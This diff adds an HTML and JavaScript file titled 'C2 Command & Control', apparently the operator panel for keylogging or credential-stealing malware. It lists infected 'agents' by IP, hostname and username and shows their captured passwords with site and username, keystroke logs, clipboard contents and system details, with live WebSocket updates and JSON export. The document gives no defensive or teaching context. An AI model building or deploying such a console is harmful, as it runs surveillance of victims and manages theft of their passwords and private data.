@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>C2 Dashboard</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#e0e0e0;font-family:'Courier New',monospace;font-size:13px}
+header{background:#0d1117;border-bottom:1px solid #ff003322;padding:12px 20px;display:flex;align-items:center;gap:12px}
+header h1{color:#ff2244;font-size:16px;letter-spacing:2px}
+.badge{background:#ff224422;color:#ff4466;border:1px solid #ff224444;padding:2px 8px;border-radius:3px;font-size:11px}
+.online-badge{background:#00ff4422;color:#00ff88;border-color:#00ff4444}
+.layout{display:grid;grid-template-columns:260px 1fr;height:calc(100vh - 49px)}
+.sidebar{background:#0d1117;border-right:1px solid #1a1a2e;overflow-y:auto;padding:10px}
+.sidebar h3{color:#888;font-size:10px;letter-spacing:2px;margin:10px 0 6px;text-transform:uppercase}
+.agent-card{background:#111;border:1px solid #1a1a2e;border-radius:4px;padding:8px 10px;margin-bottom:6px;cursor:pointer;transition:.2s}
+.agent-card:hover,.agent-card.active{border-color:#ff2244;background:#1a0a0a}
+.agent-card .aid{color:#ff4466;font-size:11px;font-weight:bold}
+.agent-card .ainfo{color:#666;font-size:10px;margin-top:2px}
+.agent-card .dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px}
+.dot.on{background:#00ff88}.dot.off{background:#444}
+.main{display:flex;flex-direction:column;overflow:hidden}
+.tabs{background:#0d1117;border-bottom:1px solid #1a1a2e;display:flex}
+.tab{padding:8px 18px;cursor:pointer;color:#666;border-bottom:2px solid transparent;font-size:12px}
+.tab:hover{color:#ccc}.tab.active{color:#ff4466;border-color:#ff4466}
+.panel{display:none;flex:1;overflow:auto;padding:16px}
+.panel.active{display:block}
+.events-list{display:flex;flex-direction:column;gap:4px}
+.event{background:#0d1117;border:1px solid #1a1a2e;border-radius:3px;padding:6px 10px;font-size:12px}
+.event.keystroke{border-left:3px solid #4488ff}
+.event.password{border-left:3px solid #ff2244;background:#1a0808}
+.event.clipboard{border-left:3px solid #ffaa00}
+.event.sysinfo{border-left:3px solid #00ff88}
+.evt-time{color:#444;font-size:10px;margin-right:8px}
+.evt-type{font-size:10px;padding:1px 5px;border-radius:2px;margin-right:8px;text-transform:uppercase}
+.t-keystroke{background:#4488ff22;color:#4488ff}
+.t-password{background:#ff224422;color:#ff4466}
+.t-clipboard{background:#ffaa0022;color:#ffaa00}
+.t-sysinfo{background:#00ff8822;color:#00ff88}
+.t-form_submit{background:#aa44ff22;color:#aa44ff}
+.t-ping{background:#33333322;color:#555}
+.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;margin-bottom:16px}
+.stat-box{background:#0d1117;border:1px solid #1a1a2e;border-radius:4px;padding:12px}
+.stat-box .val{font-size:28px;color:#ff4466;font-weight:bold}
+.stat-box .lbl{color:#666;font-size:11px;margin-top:4px}
+.password-table{width:100%;border-collapse:collapse;font-size:12px}
+.password-table th{background:#1a0a0a;color:#ff4466;padding:8px;text-align:left;border:1px solid #2a1a1a}
+.password-table td{padding:6px 8px;border:1px solid #1a1a2e;color:#ccc}
+.sysinfo-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.si-row{background:#0d1117;border:1px solid #1a1a2e;padding:8px;border-radius:3px}
+.si-key{color:#666;font-size:10px;text-transform:uppercase;letter-spacing:1px}
+.si-val{color:#e0e0e0;margin-top:3px;word-break:break-all}
+.no-agent{display:flex;align-items:center;justify-content:center;height:100%;color:#333;font-size:14px}
+.filter-bar{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
+.filter-btn{background:#111;border:1px solid #1a1a2e;color:#666;padding:4px 12px;border-radius:3px;cursor:pointer;font-size:11px;font-family:inherit}
+.filter-btn.active{background:#1a0a0a;border-color:#ff2244;color:#ff4466}
+.live-dot{width:8px;height:8px;border-radius:50%;background:#ff2244;animation:blink 1s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+.export-btn{background:#1a0a0a;border:1px solid #ff2244;color:#ff4466;padding:6px 14px;border-radius:3px;cursor:pointer;font-family:inherit;font-size:12px}
+pre{background:#050508;border:1px solid #1a1a2e;padding:10px;border-radius:3px;overflow-x:auto;color:#aaa;font-size:11px}
+</style>
+</head>
+<body>
+<header>
+  <div class="live-dot"></div>
+  <h1>C2 COMMAND &amp; CONTROL</h1>
+  <span class="badge" id="total-badge">0 Agents</span>
+  <span class="badge online-badge" id="online-badge">0 Online</span>
+  <span id="c2-port" style="margin-left:auto;color:#444;font-size:11px"></span>
+</header>
+<div class="layout">
+  <div class="sidebar">
+    <h3>Agents</h3>
+    <div id="agent-list"><div style="color:#333;padding:10px;font-size:11px">Waiting for connections...</div></div>
+  </div>
+  <div class="main">
+    <div id="no-agent" class="no-agent">Select an agent from the sidebar</div>
+    <div id="agent-view" style="display:none;flex-direction:column;height:100%">
+      <div class="tabs">
+        <div class="tab active" onclick="showTab('live',this)">Live Feed</div>
+        <div class="tab" onclick="showTab('passwords',this)">Passwords</div>
+        <div class="tab" onclick="showTab('keylog',this)">Keylog</div>
+        <div class="tab" onclick="showTab('clipboard',this)">Clipboard</div>
+        <div class="tab" onclick="showTab('sysinfo',this)">System Info</div>
+        <div class="tab" onclick="showTab('raw',this)">Raw</div>
+      </div>
+      <div id="tab-live" class="panel active">
+        <div class="stats" id="stats-box"></div>
+        <div class="filter-bar">
+          <button class="filter-btn active" onclick="setFilter('all',this)">All</button>
+          <button class="filter-btn" onclick="setFilter('password',this)">Passwords</button>
+          <button class="filter-btn" onclick="setFilter('keystroke',this)">Keystrokes</button>
+          <button class="filter-btn" onclick="setFilter('clipboard',this)">Clipboard</button>
+          <button class="export-btn" onclick="exportData()">Export JSON</button>
+        </div>
+        <div class="events-list" id="live-events"></div>
+      </div>
+      <div id="tab-passwords" class="panel">
+        <table class="password-table">
+          <thead><tr><th>Time</th><th>URL / App</th><th>Username</th><th>Password</th></tr></thead>
+          <tbody id="pw-body"></tbody>
+        </table>
+      </div>
+      <div id="tab-keylog" class="panel"><pre id="keylog-out">No keystrokes yet</pre></div>
+      <div id="tab-clipboard" class="panel"><div id="clip-out"><div style="color:#444;padding:10px">No clipboard data yet</div></div></div>
+      <div id="tab-sysinfo" class="panel"><div class="sysinfo-grid" id="sysinfo-grid"></div></div>
+      <div id="tab-raw" class="panel"><pre id="raw-log"></pre></div>
+    </div>
+  </div>
+</div>
+<script>
+var agents={},currentAgent=null,filter='all',ws=null;
+document.getElementById('c2-port').textContent='PORT:'+location.port;
+function connectWS(){
+  ws=new WebSocket('ws://'+location.host);
+  ws.onmessage=function(e){var d=JSON.parse(e.data);if(d.type==='agents_update')updateAgents(d.data);else if(d.type==='new_event')handleNewEvent(d);};
+  ws.onclose=function(){setTimeout(connectWS,2000)};
+}
+connectWS();
+function updateAgents(data){
+  agents=data;
+  var total=Object.keys(data).length,now=Date.now();
+  var online=Object.values(data).filter(function(a){return(now-new Date(a.last_seen||0).getTime())<60000}).length;
+  document.getElementById('total-badge').textContent=total+' Agents';
+  document.getElementById('online-badge').textContent=online+' Online';
+  var list=document.getElementById('agent-list');list.innerHTML='';
+  Object.entries(data).forEach(function(entry){
+    var id=entry[0],a=entry[1];
+    var isOnline=(now-new Date(a.last_seen||0).getTime())<60000;
+    var el=document.createElement('div');el.className='agent-card'+(currentAgent===id?' active':'');
+    el.onclick=function(){selectAgent(id,el)};
+    el.innerHTML='<div class="aid"><span class="dot '+(isOnline?'on':'off')+'"></span>'+id.slice(0,12)+'</div>'
+      +'<div class="ainfo">'+(a.ip||'?')+' | '+(a.os||'?')+'</div>'
+      +'<div class="ainfo">'+(a.hostname||'?')+' / '+(a.username||'?')+'</div>'
+      +'<div class="ainfo">'+(a.events?a.events.length:0)+' events</div>';
+    list.appendChild(el);
+  });
+  if(currentAgent&&agents[currentAgent])renderAgent(agents[currentAgent]);
+}
+function selectAgent(id,el){
+  currentAgent=id;
+  document.getElementById('no-agent').style.display='none';
+  document.getElementById('agent-view').style.display='flex';
+  document.querySelectorAll('.agent-card').forEach(function(c){c.classList.remove('active')});
+  if(el)el.classList.add('active');
+  renderAgent(agents[id]);
+}
+function renderAgent(a){
+  if(!a)return;
+  var evts=a.events||[];
+  var pwCount=evts.filter(function(e){return e.type==='password'}).length;
+  var keyCount=evts.filter(function(e){return e.type==='keystroke'}).length;
+  var clipCount=evts.filter(function(e){return e.type==='clipboard'}).length;
+  document.getElementById('stats-box').innerHTML=
+    '<div class="stat-box"><div class="val">'+evts.length+'</div><div class="lbl">Total Events</div></div>'
+    +'<div class="stat-box"><div class="val" style="color:#ff4466">'+pwCount+'</div><div class="lbl">Passwords</div></div>'
+    +'<div class="stat-box"><div class="val" style="color:#4488ff">'+keyCount+'</div><div class="lbl">Keystrokes</div></div>'
+    +'<div class="stat-box"><div class="val" style="color:#ffaa00">'+clipCount+'</div><div class="lbl">Clipboard</div></div>';
+  var filtered=filter==='all'?evts:evts.filter(function(e){return e.type===filter});
+  document.getElementById('live-events').innerHTML=filtered.slice(-100).reverse().map(eventHtml).join('');
+  var pwRows=evts.filter(function(e){return e.type==='password'});
+  document.getElementById('pw-body').innerHTML=pwRows.length?pwRows.map(function(e){return'<tr><td>'+(e.t||'').slice(0,19)+'</td><td>'+(e.url||e.app||'')+'</td><td>'+(e.username||'')+'</td><td style="color:#ff4466;font-weight:bold">'+(e.password||'')+'</td></tr>'}).join(''):'<tr><td colspan=4 style="color:#444;text-align:center;padding:20px">No passwords captured yet</td></tr>';
+  var keys=evts.filter(function(e){return e.type==='keystroke'}).map(function(e){return e.key||e.data||''}).join('');
+  document.getElementById('keylog-out').textContent=keys||'No keystrokes yet';
+  var clips=evts.filter(function(e){return e.type==='clipboard'});
+  document.getElementById('clip-out').innerHTML=clips.length?clips.map(function(e){return'<div class="event clipboard"><span class="evt-time">'+(e.t||'').slice(0,19)+'</span> '+(e.data||'')+'</div>'}).join(''):'<div style="color:#444;padding:10px">No clipboard data yet</div>';
+  var si=evts.find(function(e){return e.type==='sysinfo'});
+  if(si){var fields=['os','hostname','username','cpu','ram','screen','browser','lang','tz','ip'];document.getElementById('sysinfo-grid').innerHTML=fields.map(function(f){return si[f]?'<div class="si-row"><div class="si-key">'+f+'</div><div class="si-val">'+si[f]+'</div></div>':''}).join('');}
+  document.getElementById('raw-log').textContent=JSON.stringify(a,null,2);
+}
+function eventHtml(e){
+  var type=e.type||'unknown',time=(e.t||'').slice(0,19),data='';
+  if(type==='keystroke')data=escH(e.key||e.data||'');
+  else if(type==='password')data='<b style="color:#ff4466">'+escH(e.password||'')+'</b> @ '+escH(e.url||e.app||'')+' (user: '+escH(e.username||'?')+')';
+  else if(type==='clipboard')data=escH((e.data||'').slice(0,120));
+  else if(type==='sysinfo')data=escH((e.os||'')+'|'+(e.hostname||'')+'|'+(e.username||''));
+  else data=escH(JSON.stringify(e).slice(0,120));
+  return'<div class="event '+type+'"><span class="evt-time">'+time+'</span><span class="evt-type t-'+type+'">'+type+'</span><span class="evt-data">'+data+'</span></div>';
+}
+function escH(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+function handleNewEvent(d){if(d.agentId===currentAgent&&agents[currentAgent]){agents[currentAgent].events.push(d.event);renderAgent(agents[currentAgent]);}}
+function showTab(name,el){document.querySelectorAll('.panel').forEach(function(p){p.classList.remove('active')});document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active')});document.getElementById('tab-'+name).classList.add('active');if(el)el.classList.add('active');}
+function setFilter(f,btn){filter=f;document.querySelectorAll('.filter-btn').forEach(function(b){b.classList.remove('active')});btn.classList.add('active');if(currentAgent)renderAgent(agents[currentAgent]);}
+function exportData(){if(!currentAgent)return;var blob=new Blob([JSON.stringify(agents[currentAgent],null,2)],{type:'application/json'});var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='agent_'+currentAgent+'.json';a.click();}
+</script>
+</body>
+</html>
